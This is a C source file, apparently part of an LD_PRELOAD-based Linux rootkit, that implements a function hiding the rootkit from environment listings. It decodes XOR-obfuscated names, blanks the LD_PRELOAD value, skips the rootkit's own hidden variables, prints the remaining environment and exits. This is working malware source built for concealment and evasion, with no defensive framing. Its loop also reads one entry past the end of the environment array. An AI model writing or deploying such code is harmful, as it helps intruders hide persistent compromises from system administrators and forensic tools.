#include "../rkconsts.h"

void hide_exec_env(char **argv, char **envp) {
    DEBUG_MSG("[-] hide_exec_env called\n");
    int i = 0;
    // while (argv[i] != NULL) {
    //     DEBUG_MSG("argv: %s\n", argv[i]);
    //     i++;
    // }
    // i = 0;
    while (envp[i] != NULL) {
        i++;
    }

    char *hidden_str = strdup(HIDDEN_STR); xor(hidden_str);
    char *libzphook = strdup(LIBZPHOOK); xor(libzphook);
    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
    char *hidden_env_var_name = strdup(HIDDEN_ENV_VAR_NAME); xor(hidden_env_var_name);
    for (int j=0; j <= i; j++) {
        char *env_full = strdup(envp[j]);
        char *env_var_name = strtok(env_full, "=");
        char *env_var_val = strtok(NULL, "=");
        DEBUG_MSG("[-] %s=%s\n", env_var_name, env_var_val);
        // Clear out LD_PRELOAD
        if (strcmp(env_var_name, ld_preload) == 0) {
            DEBUG_MSG("[!] Clearing LD_PRELOAD env var val\n");
            *env_var_val = '\0';
        }
        // Skip line with our hidden env var name 
        else if (strcmp(env_var_name, hidden_env_var_name) == 0) {
            DEBUG_MSG("[!] Skipping hidden env var line\n");
            continue;
        }
        // Skip line with LIPZPHOOK=
        else if (strcmp(env_var_name, libzphook) == 0) {
            DEBUG_MSG("[!] Skipping LIBZPHOOK line\n");
            continue;
        }
        printf("%s=%s\n", env_var_name, env_var_val);
    }
    CLEAN(hidden_str);
    CLEAN(libzphook);
    CLEAN(ld_preload);
    CLEAN(hidden_env_var_name);
    exit(0);
}

